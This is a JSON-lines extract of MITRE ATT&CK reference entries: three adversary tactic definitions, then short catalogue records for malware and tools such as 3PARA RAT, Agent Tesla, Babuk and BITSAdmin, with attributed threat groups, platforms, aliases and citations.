{"ID":"TA0004","name":"Privilege Escalation","description":"The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ","url":"https://attack.mitre.org/tactics/TA0004","created":"17 October 2018","last modified":"06 January 2021","version":"1.0"}
{"ID":"TA0043","name":"Reconnaissance","description":"The adversary is trying to gather information they can use to plan future operations.\n\nReconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. Such information may include details of the victim organization, infrastructure, or staff/personnel. This information can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute Initial Access, to scope and prioritize post-compromise objectives, or to drive and lead further Reconnaissance efforts.","url":"https://attack.mitre.org/tactics/TA0043","created":"02 October 2020","last modified":"18 October 2020","version":"1.0"}
{"ID":"TA0042","name":"Resource Development","description":"The adversary is trying to establish resources they can use to support operations.\n\nResource Development consists of techniques that involve adversaries creating, purchasing, or compromising/stealing resources that can be used to support targeting. Such resources include infrastructure, accounts, or capabilities. These resources can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using purchased domains to support Command and Control, email accounts for phishing as a part of Initial Access, or stealing code signing certificates to help with Defense Evasion.","url":"https://attack.mitre.org/tactics/TA0042","created":"30 September 2020","last modified":"30 September 2020","version":"1.0"}
{"ID":"S0066","name":"3PARA RAT","description":"[3PARA RAT](https://attack.mitre.org/software/S0066) is a remote access tool (RAT) programmed in C++ that has been used by [Putter Panda](https://attack.mitre.org/groups/G0024). (Citation: CrowdStrike Putter Panda)","url":"https://attack.mitre.org/software/S0066","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: CrowdStrike Putter Panda),,(Citation: CrowdStrike Putter Panda)"}
{"ID":"S0065","name":"4H RAT","description":"[4H RAT](https://attack.mitre.org/software/S0065) is malware that has been used by [Putter Panda](https://attack.mitre.org/groups/G0024) since at least 2007. (Citation: CrowdStrike Putter Panda)","url":"https://attack.mitre.org/software/S0065","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: CrowdStrike Putter Panda),,(Citation: CrowdStrike Putter Panda)"}
{"ID":"S0677","name":"AADInternals","description":"[AADInternals](https://attack.mitre.org/software/S0677) is a PowerShell-based framework for administering, enumerating, and exploiting Azure Active Directory. The tool is publicly available on GitHub.(Citation: AADInternals Github)(Citation: AADInternals Documentation)","url":"https://attack.mitre.org/software/S0677","created":"01 February 2022","last modified":"15 April 2023","version":"1.2","contributors":null,"platforms":"Azure AD, Office 365, Windows","aliases":null,"type":"tool","relationship citations":"(Citation: MSTIC Nobelium Oct 2021),,(Citation: AADInternals Azure AD On-Prem to Cloud),(Citation: AADInternals Documentation),(Citation: Azure AD Recon),(Citation: AADInternals Root Access to Azure VMs),(Citation: Azure AD Federation Vulnerability)"}
{"ID":"S0469","name":"ABK","description":"[ABK](https://attack.mitre.org/software/S0469) is a downloader that has been used by [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) since at least 2019.(Citation: Trend Micro Tick November 2019)","url":"https://attack.mitre.org/software/S0469","created":"10 June 2020","last modified":"24 June 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Trend Micro Tick November 2019),,(Citation: Trend Micro Tick November 2019)"}
{"ID":"S0045","name":"ADVSTORESHELL","description":"[ADVSTORESHELL](https://attack.mitre.org/software/S0045) is a spying backdoor that has been used by [APT28](https://attack.mitre.org/groups/G0007) from at least 2012 to 2016. It is generally used for long-term espionage and is deployed on targets deemed interesting after a reconnaissance phase. (Citation: Kaspersky Sofacy) (Citation: ESET Sednit Part 2)","url":"https://attack.mitre.org/software/S0045","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":"AZZY, EVILTOSS, NETUI, Sedreco","type":"malware","relationship citations":"(Citation: Securelist Sofacy Feb 2018),(Citation: Kaspersky Sofacy),,(Citation: ESET Sednit Part 2),(Citation: Bitdefender APT28 Dec 2015),(Citation: Kaspersky Sofacy)"}
{"ID":"S0073","name":"ASPXSpy","description":"[ASPXSpy](https://attack.mitre.org/software/S0073) is a Web shell. It has been modified by [Threat Group-3390](https://attack.mitre.org/groups/G0027) actors to create the ASPXTool version. (Citation: Dell TG-3390)","url":"https://attack.mitre.org/software/S0073","created":"31 May 2017","last modified":"22 September 2022","version":"1.2","contributors":null,"platforms":"Windows","aliases":"ASPXTool","type":"malware","relationship citations":"(Citation: Volexity Exchange Marauder March 2021),(Citation: Profero APT27 December 2020),(Citation: FireEye APT41 Aug 2019),(Citation: Dell TG-3390),(Citation: FireEye APT39 Jan 2019),(Citation: McAfee Night Dragon),(Citation: Dell TG-3390)"}
{"ID":"S1028","name":"Action RAT","description":"[Action RAT](https://attack.mitre.org/software/S1028) is a  remote access tool written in Delphi that has been used by [SideCopy](https://attack.mitre.org/groups/G1008) since at least December 2021 against Indian and Afghani government personnel.(Citation: MalwareBytes SideCopy Dec 2021)","url":"https://attack.mitre.org/software/S1028","created":"07 August 2022","last modified":"24 August 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: MalwareBytes SideCopy Dec 2021)"}
{"ID":"S0552","name":"AdFind","description":"[AdFind](https://attack.mitre.org/software/S0552) is a free command-line query tool that can be used for gathering information from Active Directory.(Citation: Red Canary Hospital Thwarted Ryuk October 2020)(Citation: FireEye FIN6 Apr 2019)(Citation: FireEye Ryuk and Trickbot January 2019)","url":"https://attack.mitre.org/software/S0552","created":"28 December 2020","last modified":"02 March 2023","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"tool","relationship citations":"(Citation: FireEye Ryuk and Trickbot January 2019),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: DFIR Ryuk's Return October 2020),(Citation: FireEye FIN6 Apr 2019),(Citation: CrowdStrike StellarParticle January 2022),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: ESET T3 Threat Report 2021),(Citation: NCC Group TA505),(Citation: Symantec Cicada November 2020),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: DFIR Conti Bazar Nov 2021),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: FireEye Ryuk and Trickbot January 2019),(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: FireEye FIN6 Apr 2019),(Citation: Cybereason Bumblebee August 2022),(Citation: Symantec Bumblebee June 2022)"}
{"ID":"S0331","name":"Agent Tesla","description":"[Agent Tesla](https://attack.mitre.org/software/S0331) is a spyware Trojan written for the .NET framework that has been observed since at least 2014.(Citation: Fortinet Agent Tesla April 2018)(Citation: Bitdefender Agent Tesla April 2020)(Citation: Malwarebytes Agent Tesla April 2020)","url":"https://attack.mitre.org/software/S0331","created":"29 January 2019","last modified":"21 April 2021","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Unit42 SilverTerrier 2018),,(Citation: Fortinet Agent Tesla April 2018),(Citation: Fortinet Agent Tesla June 2017),(Citation: DigiTrust Agent Tesla Jan 2017),(Citation: Talos Agent Tesla Oct 2018),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: Bitdefender Agent Tesla April 2020),(Citation: Malwarebytes Agent Tesla April 2020)"}
{"ID":"S0092","name":"Agent.btz","description":"[Agent.btz](https://attack.mitre.org/software/S0092) is a worm that primarily spreads itself via removable devices such as USB drives. It reportedly infected U.S. military networks in 2008. (Citation: Securelist Agent.btz)","url":"https://attack.mitre.org/software/S0092","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Securelist Agent.btz),(Citation: ThreatExpert Agent.btz)"}
{"ID":"S1025","name":"Amadey","description":"[Amadey](https://attack.mitre.org/software/S1025) is a Trojan bot that has been used since at least October 2018.(Citation: Korean FSI TA505 2020)(Citation: BlackBerry Amadey 2020)","url":"https://attack.mitre.org/software/S1025","created":"14 July 2022","last modified":"14 October 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: BlackBerry Amadey 2020),(Citation: Korean FSI TA505 2020),,(Citation: BlackBerry Amadey 2020),(Citation: Korean FSI TA505 2020)"}
{"ID":"S0504","name":"Anchor","description":"[Anchor](https://attack.mitre.org/software/S0504) is one of a family of backdoor malware that has been used in conjunction with [TrickBot](https://attack.mitre.org/software/S0266) on selected high profile targets since at least 2018.(Citation: Cyberreason Anchor December 2019)(Citation: Medium Anchor DNS July 2020)","url":"https://attack.mitre.org/software/S0504","created":"10 September 2020","last modified":"15 December 2021","version":"1.0","contributors":"Cybereason Nocturnus, @nocturnus","platforms":"Linux, Windows","aliases":"Anchor_DNS","type":"malware","relationship citations":",,(Citation: Cyberreason Anchor December 2019),(Citation: Medium Anchor DNS July 2020)"}
{"ID":"S0584","name":"AppleJeus","description":"[AppleJeus](https://attack.mitre.org/software/S0584) is a family of downloaders initially discovered in 2018 embedded within trojanized cryptocurrency applications. [AppleJeus](https://attack.mitre.org/software/S0584) has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032), targeting companies in the energy, finance, government, industry, technology, and telecommunications sectors, and several countries including the United States, United Kingdom, South Korea, Australia, Brazil, New Zealand, and Russia. [AppleJeus](https://attack.mitre.org/software/S0584) has been used to distribute the [FALLCHILL](https://attack.mitre.org/software/S0181) RAT.(Citation: CISA AppleJeus Feb 2021)","url":"https://attack.mitre.org/software/S0584","created":"01 March 2021","last modified":"28 September 2022","version":"1.1","contributors":null,"platforms":"Windows, macOS","aliases":null,"type":"malware","relationship citations":"(Citation: CISA AppleJeus Feb 2021),,(Citation: ObjectiveSee AppleJeus 2019),(Citation: CISA AppleJeus Feb 2021)"}
{"ID":"S0622","name":"AppleSeed","description":"[AppleSeed](https://attack.mitre.org/software/S0622) is a backdoor that has been used by [Kimsuky](https://attack.mitre.org/groups/G0094) to target South Korean government, academic, and commercial  targets since at least 2021.(Citation: Malwarebytes Kimsuky June 2021)","url":"https://attack.mitre.org/software/S0622","created":"10 June 2021","last modified":"15 March 2022","version":"1.1","contributors":null,"platforms":"Android, Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Malwarebytes Kimsuky June 2021),(Citation: KISA Operation Muzabi),,(Citation: Malwarebytes Kimsuky June 2021),(Citation: KISA Operation Muzabi)"}
{"ID":"S0456","name":"Aria-body","description":"[Aria-body](https://attack.mitre.org/software/S0456) is a custom backdoor that has been used by [Naikon](https://attack.mitre.org/groups/G0019) since approximately 2017.(Citation: CheckPoint Naikon May 2020)","url":"https://attack.mitre.org/software/S0456","created":"26 May 2020","last modified":"19 August 2021","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: CheckPoint Naikon May 2020),(Citation: Bitdefender Naikon April 2021),,(Citation: CheckPoint Naikon May 2020)"}
{"ID":"S0099","name":"Arp","description":"[Arp](https://attack.mitre.org/software/S0099) displays and modifies information about a system's Address Resolution Protocol (ARP) cache. (Citation: TechNet Arp)","url":"https://attack.mitre.org/software/S0099","created":"31 May 2017","last modified":"07 December 2021","version":"1.1","contributors":null,"platforms":"Linux, Windows, macOS","aliases":"arp.exe","type":"tool","relationship citations":"(Citation: Kaspersky Turla),(Citation: Symantec Orangeworm April 2018),(Citation: Cybereason Cobalt Kitty 2017),,(Citation: TechNet Arp),(Citation: Palo Alto ARP)"}
{"ID":"S0373","name":"Astaroth","description":"[Astaroth](https://attack.mitre.org/software/S0373) is a Trojan and information stealer known to affect companies in Europe, Brazil, and throughout Latin America. It has been known publicly since at least late 2017. (Citation: Cybereason Astaroth Feb 2019)(Citation: Cofense Astaroth Sept 2018)(Citation: Securelist Brazilian Banking Malware July 2020)","url":"https://attack.mitre.org/software/S0373","created":"17 April 2019","last modified":"21 March 2023","version":"2.1","contributors":"Carlos Borges, @huntingneo, CIP","platforms":"Windows","aliases":"Guildma","type":"malware","relationship citations":",,(Citation: Cybereason Astaroth Feb 2019),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Cofense Astaroth Sept 2018)"}
{"ID":"S0438","name":"Attor","description":"[Attor](https://attack.mitre.org/software/S0438) is a Windows-based espionage platform that has been seen in use since 2013. [Attor](https://attack.mitre.org/software/S0438) has a loadable plugin architecture to customize functionality for specific targets.(Citation: ESET Attor Oct 2019)","url":"https://attack.mitre.org/software/S0438","created":"06 May 2020","last modified":"07 July 2020","version":"1.0","contributors":"ESET","platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: ESET Attor Oct 2019)"}
{"ID":"S1029","name":"AuTo Stealer","description":"[AuTo Stealer](https://attack.mitre.org/software/S1029) is malware written in C++ has been used by [SideCopy](https://attack.mitre.org/groups/G1008) since at least December 2021 to target government agencies and personnel in India and Afghanistan.(Citation: MalwareBytes SideCopy Dec 2021)","url":"https://attack.mitre.org/software/S1029","created":"07 August 2022","last modified":"24 August 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: MalwareBytes SideCopy Dec 2021)"}
{"ID":"S0347","name":"AuditCred","description":"[AuditCred](https://attack.mitre.org/software/S0347) is a malicious DLL that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032) during their 2018 attacks.(Citation: TrendMicro Lazarus Nov 2018)","url":"https://attack.mitre.org/software/S0347","created":"30 January 2019","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":"Roptimizer","type":"malware","relationship citations":"(Citation: TrendMicro Lazarus Nov 2018),,(Citation: TrendMicro Lazarus Nov 2018)"}
{"ID":"S0129","name":"AutoIt backdoor","description":"[AutoIt backdoor](https://attack.mitre.org/software/S0129) is malware that has been used by the actors responsible for the MONSOON campaign. The actors frequently used it in weaponized .pps files exploiting CVE-2014-6352. (Citation: Forcepoint Monsoon) This malware makes use of the legitimate scripting language for Windows GUI automation with the same name.","url":"https://attack.mitre.org/software/S0129","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Forcepoint Monsoon),(Citation: Symantec Elfin Mar 2019),,(Citation: Forcepoint Monsoon)"}
{"ID":"S0640","name":"Avaddon","description":"[Avaddon](https://attack.mitre.org/software/S0640) is ransomware written in C++ that has been offered as Ransomware-as-a-Service (RaaS) since at least June 2020.(Citation: Awake Security Avaddon)(Citation: Arxiv Avaddon Feb 2021)","url":"https://attack.mitre.org/software/S0640","created":"23 August 2021","last modified":"18 October 2021","version":"1.0","contributors":"Matt Brenton, Zurich Global Information Security","platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Hornet Security Avaddon June 2020),(Citation: Arxiv Avaddon Feb 2021),(Citation: Awake Security Avaddon)"}
{"ID":"S0473","name":"Avenger","description":"[Avenger](https://attack.mitre.org/software/S0473) is a downloader that has been used by [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) since at least 2019.(Citation: Trend Micro Tick November 2019)","url":"https://attack.mitre.org/software/S0473","created":"11 June 2020","last modified":"24 June 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Trend Micro Tick November 2019),,(Citation: Trend Micro Tick November 2019)"}
{"ID":"S1053","name":"AvosLocker","description":"[AvosLocker](https://attack.mitre.org/software/S1053) is ransomware written in C++ that has been offered via the Ransomware-as-a-Service (RaaS) model. It was first observed in June 2021 and has been used against financial services, critical manufacturing, government facilities, and other critical infrastructure sectors in the United States. As of March 2022, [AvosLocker](https://attack.mitre.org/software/S1053) had also been used against organizations in Belgium, Canada, China, Germany, Saudi Arabia, Spain, Syria, Taiwan, Turkey, the United Arab Emirates, and the United Kingdom.(Citation: Malwarebytes AvosLocker Jul 2021)(Citation: Trend Micro AvosLocker Apr 2022)(Citation: Joint CSA AvosLocker Mar 2022)","url":"https://attack.mitre.org/software/S1053","created":"11 January 2023","last modified":"15 February 2023","version":"1.0","contributors":"Flavio Costa, Cisco","platforms":"Linux, Windows","aliases":null,"type":"malware","relationship citations":",(Citation: Cisco Talos Avos Jun 2022),(Citation: Costa AvosLocker May 2022),(Citation: Costa AvosLocker May 2022),(Citation: Malwarebytes AvosLocker Jul 2021),(Citation: Trend Micro AvosLocker Apr 2022),(Citation: Cisco Talos Avos Jun 2022),(Citation: Joint CSA AvosLocker Mar 2022)"}
{"ID":"S0344","name":"Azorult","description":"[Azorult](https://attack.mitre.org/software/S0344) is a commercial Trojan that is used to steal information from compromised hosts. [Azorult](https://attack.mitre.org/software/S0344) has been observed in the wild as early as 2016.\nIn July 2018, [Azorult](https://attack.mitre.org/software/S0344) was seen used in a spearphishing campaign against targets in North America. [Azorult](https://attack.mitre.org/software/S0344) has been seen used for cryptocurrency theft. (Citation: Unit42 Azorult Nov 2018)(Citation: Proofpoint Azorult July 2018)","url":"https://attack.mitre.org/software/S0344","created":"30 January 2019","last modified":"13 October 2022","version":"1.3","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: NCC Group TA505),,(Citation: Unit42 Azorult Nov 2018),(Citation: Proofpoint Azorult July 2018)"}
{"ID":"S0031","name":"BACKSPACE","description":"[BACKSPACE](https://attack.mitre.org/software/S0031) is a backdoor used by [APT30](https://attack.mitre.org/groups/G0013) that dates back to at least 2005. (Citation: FireEye APT30)","url":"https://attack.mitre.org/software/S0031","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":"Lecna","type":"malware","relationship citations":"(Citation: FireEye APT30),,(Citation: FireEye APT30)"}
{"ID":"S0245","name":"BADCALL","description":"[BADCALL](https://attack.mitre.org/software/S0245) is a Trojan malware variant used by the group [Lazarus Group](https://attack.mitre.org/groups/G0032). (Citation: US-CERT BADCALL)","url":"https://attack.mitre.org/software/S0245","created":"17 October 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: US-CERT BADCALL),,(Citation: US-CERT BADCALL)"}
{"ID":"S0642","name":"BADFLICK","description":"[BADFLICK](https://attack.mitre.org/software/S0642) is a backdoor used by [Leviathan](https://attack.mitre.org/groups/G0065) in spearphishing campaigns first reported in 2018 that targeted the U.S. engineering and maritime industries.(Citation: FireEye Periscope March 2018)(Citation: Accenture MUDCARP March 2019)","url":"https://attack.mitre.org/software/S0642","created":"26 August 2021","last modified":"15 October 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Accenture MUDCARP March 2019),(Citation: FireEye Periscope March 2018),,(Citation: Accenture MUDCARP March 2019)"}
{"ID":"S0128","name":"BADNEWS","description":"[BADNEWS](https://attack.mitre.org/software/S0128) is malware that has been used by the actors responsible for the [Patchwork](https://attack.mitre.org/groups/G0040) campaign. Its name was given due to its use of RSS feeds, forums, and blogs for command and control. (Citation: Forcepoint Monsoon) (Citation: TrendMicro Patchwork Dec 2017)","url":"https://attack.mitre.org/software/S0128","created":"31 May 2017","last modified":"21 June 2021","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Forcepoint Monsoon),(Citation: TrendMicro Patchwork Dec 2017),,(Citation: Forcepoint Monsoon),(Citation: TrendMicro Patchwork Dec 2017),(Citation: PaloAlto Patchwork Mar 2018)"}
{"ID":"S0470","name":"BBK","description":"[BBK](https://attack.mitre.org/software/S0470) is a downloader that has been used by [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) since at least 2019.(Citation: Trend Micro Tick November 2019)","url":"https://attack.mitre.org/software/S0470","created":"10 June 2020","last modified":"24 June 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Trend Micro Tick November 2019),,(Citation: Trend Micro Tick November 2019)"}
{"ID":"S0127","name":"BBSRAT","description":"[BBSRAT](https://attack.mitre.org/software/S0127) is malware with remote access tool functionality that has been used in targeted compromises. (Citation: Palo Alto Networks BBSRAT)","url":"https://attack.mitre.org/software/S0127","created":"31 May 2017","last modified":"30 March 2020","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Palo Alto Networks BBSRAT)"}
{"ID":"S0017","name":"BISCUIT","description":"[BISCUIT](https://attack.mitre.org/software/S0017) is a backdoor that has been used by [APT1](https://attack.mitre.org/groups/G0006) since as early as 2007. (Citation: Mandiant APT1)","url":"https://attack.mitre.org/software/S0017","created":"31 May 2017","last modified":"30 March 2020","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Mandiant APT1),,(Citation: Mandiant APT1 Appendix),(Citation: Mandiant APT1)"}
{"ID":"S0190","name":"BITSAdmin","description":"[BITSAdmin](https://attack.mitre.org/software/S0190) is a command line tool used to create and manage [BITS Jobs](https://attack.mitre.org/techniques/T1197). (Citation: Microsoft BITSAdmin)","url":"https://attack.mitre.org/software/S0190","created":"18 April 2018","last modified":"13 October 2022","version":"1.3","contributors":"Edward Millington","platforms":"Windows","aliases":null,"type":"tool","relationship citations":"(Citation: Kaspersky Lyceum October 2021),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: FireEye Periscope March 2018),(Citation: TrendMicro Tropic Trooper Mar 2018),(Citation: FireEye APT41 March 2020),,(Citation: Microsoft BITSAdmin),(Citation: TrendMicro Tropic Trooper Mar 2018),(Citation: Microsoft About BITS)"}
{"ID":"S0069","name":"BLACKCOFFEE","description":"[BLACKCOFFEE](https://attack.mitre.org/software/S0069) is malware that has been used by several Chinese groups since at least 2013. (Citation: FireEye APT17) (Citation: FireEye Periscope March 2018)","url":"https://attack.mitre.org/software/S0069","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye APT17),(Citation: FireEye APT41 Aug 2019),(Citation: FireEye Periscope March 2018),,(Citation: FireEye APT17),(Citation: FireEye Periscope March 2018)"}
{"ID":"S0520","name":"BLINDINGCAN","description":"[BLINDINGCAN](https://attack.mitre.org/software/S0520) is a remote access Trojan that has been used by the North Korean government since at least early 2020 in cyber operations against defense, engineering, and government organizations in Western Europe and the US.(Citation: US-CERT BLINDINGCAN Aug 2020)(Citation: NHS UK BLINDINGCAN Aug 2020)","url":"https://attack.mitre.org/software/S0520","created":"27 October 2020","last modified":"17 March 2021","version":"1.0","contributors":"Daniyal Naeem, BT Security","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: US-CERT BLINDINGCAN Aug 2020),,(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: NHS UK BLINDINGCAN Aug 2020)"}
{"ID":"S0657","name":"BLUELIGHT","description":"[BLUELIGHT](https://attack.mitre.org/software/S0657) is a remote access Trojan used by [APT37](https://attack.mitre.org/groups/G0067) that was first observed in early 2021.(Citation: Volexity InkySquid BLUELIGHT August 2021)","url":"https://attack.mitre.org/software/S0657","created":"01 October 2021","last modified":"15 October 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Volexity InkySquid BLUELIGHT August 2021),,(Citation: Volexity InkySquid BLUELIGHT August 2021)"}
{"ID":"S0360","name":"BONDUPDATER","description":"[BONDUPDATER](https://attack.mitre.org/software/S0360) is a PowerShell backdoor used by [OilRig](https://attack.mitre.org/groups/G0049). It was first observed in November 2017 during targeting of a Middle Eastern government organization, and an updated version was observed in August 2018 being used to target a government organization with spearphishing emails.(Citation: FireEye APT34 Dec 2017)(Citation: Palo Alto OilRig Sep 2018)","url":"https://attack.mitre.org/software/S0360","created":"18 February 2019","last modified":"09 February 2021","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Palo Alto OilRig Sep 2018),(Citation: FireEye APT34 Dec 2017),,(Citation: Palo Alto OilRig Sep 2018),(Citation: FireEye APT34 Dec 2017)"}
{"ID":"S0415","name":"BOOSTWRITE","description":"[BOOSTWRITE](https://attack.mitre.org/software/S0415) is a loader crafted to be launched via abuse of the DLL search order of applications used by [FIN7](https://attack.mitre.org/groups/G0046).(Citation: FireEye FIN7 Oct 2019)","url":"https://attack.mitre.org/software/S0415","created":"11 October 2019","last modified":"15 October 2019","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye FIN7 Oct 2019),,(Citation: FireEye FIN7 Oct 2019)"}
{"ID":"S0114","name":"BOOTRASH","description":"[BOOTRASH](https://attack.mitre.org/software/S0114) is a [Bootkit](https://attack.mitre.org/techniques/T1542/003) that targets Windows operating systems. It has been used by threat actors that target the financial sector.(Citation: Mandiant M Trends 2016)(Citation: FireEye Bootkits)(Citation: FireEye BOOTRASH SANS)","url":"https://attack.mitre.org/software/S0114","created":"31 May 2017","last modified":"09 June 2021","version":"1.1","contributors":"Christopher Glyer, Mandiant, @cglyer","platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Mandiant M Trends 2016),(Citation: FireEye Bootkits),(Citation: FireEye BOOTRASH SANS)"}
{"ID":"S0014","name":"BS2005","description":"[BS2005](https://attack.mitre.org/software/S0014) is malware that was used by [Ke3chang](https://attack.mitre.org/groups/G0004) in spearphishing campaigns since at least 2011. (Citation: Mandiant Operation Ke3chang November 2014)","url":"https://attack.mitre.org/software/S0014","created":"31 May 2017","last modified":"01 November 2021","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Mandiant Operation Ke3chang November 2014)"}
{"ID":"S0043","name":"BUBBLEWRAP","description":"[BUBBLEWRAP](https://attack.mitre.org/software/S0043) is a full-featured, second-stage backdoor used by the [admin@338](https://attack.mitre.org/groups/G0018) group. It is set to run when the system boots and includes functionality to check, upload, and register plug-ins that can further enhance its capabilities. (Citation: FireEye admin@338)","url":"https://attack.mitre.org/software/S0043","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":"Backdoor.APT.FakeWinHTTPHelper","type":"malware","relationship citations":"(Citation: FireEye admin@338),,(Citation: FireEye admin@338)"}
{"ID":"S0638","name":"Babuk","description":"[Babuk](https://attack.mitre.org/software/S0638) is a Ransomware-as-a-service (RaaS) malware that has been used since at least 2021. The operators of [Babuk](https://attack.mitre.org/software/S0638) employ a \"Big Game Hunting\" approach to targeting major enterprises and operate a leak site to post stolen data as part of their extortion scheme.(Citation: Sogeti CERT ESEC Babuk March 2021)(Citation: McAfee Babuk February 2021)(Citation: CyberScoop Babuk February 2021)","url":"https://attack.mitre.org/software/S0638","created":"11 August 2021","last modified":"13 October 2021","version":"1.0","contributors":"Daniyal Naeem, BT Security; Hiroki Nagahama, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India","platforms":"Linux, Windows","aliases":"Babyk, Vasa Locker","type":"malware","relationship citations":",,(Citation: Medium Babuk February 2021),(Citation: McAfee Babuk February 2021),(Citation: Trend Micro Ransomware February 2021),(Citation: Sogeti CERT ESEC Babuk March 2021)"}
{"ID":"S0414","name":"BabyShark","description":"[BabyShark](https://attack.mitre.org/software/S0414) is a Microsoft Visual Basic (VB) script-based malware family that is believed to be associated with several North Korean campaigns. (Citation: Unit42 BabyShark Feb 2019)","url":"https://attack.mitre.org/software/S0414","created":"07 October 2019","last modified":"12 March 2021","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: CISA AA20-301A Kimsuky),(Citation: Cybereason Kimsuky November 2020),(Citation: Crowdstrike GTR2020 Mar 2020),,(Citation: Unit42 BabyShark Feb 2019),(Citation: CISA AA20-301A Kimsuky),(Citation: Unit42 BabyShark Apr 2019),(Citation: Crowdstrike GTR2020 Mar 2020)"}
{"ID":"S0475","name":"BackConfig","description":"[BackConfig](https://attack.mitre.org/software/S0475) is a custom Trojan with a flexible plugin architecture that has been used by [Patchwork](https://attack.mitre.org/groups/G0040).(Citation: Unit 42 BackConfig May 2020)","url":"https://attack.mitre.org/software/S0475","created":"17 June 2020","last modified":"22 March 2023","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Unit 42 BackConfig May 2020),,(Citation: Unit 42 BackConfig May 2020)"}
{"ID":"S0093","name":"Backdoor.Oldrea","description":"[Backdoor.Oldrea](https://attack.mitre.org/software/S0093) is a modular backdoor that used by [Dragonfly](https://attack.mitre.org/groups/G0035) against energy companies since at least 2013. [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) was distributed via supply chain compromise, and included specialized modules to enumerate and map ICS-specific systems, processes, and protocols.(Citation: Symantec Dragonfly)(Citation: Gigamon Berserk Bear October 2021)(Citation: Symantec Dragonfly Sept 2017)","url":"https://attack.mitre.org/software/S0093","created":"31 May 2017","last modified":"12 October 2022","version":"2.0","contributors":null,"platforms":"Windows","aliases":"Havex","type":"malware","relationship citations":"(Citation: Gigamon Berserk Bear October 2021),(Citation: Symantec Dragonfly),,(Citation: Gigamon Berserk Bear October 2021),(Citation: Symantec Dragonfly)"}
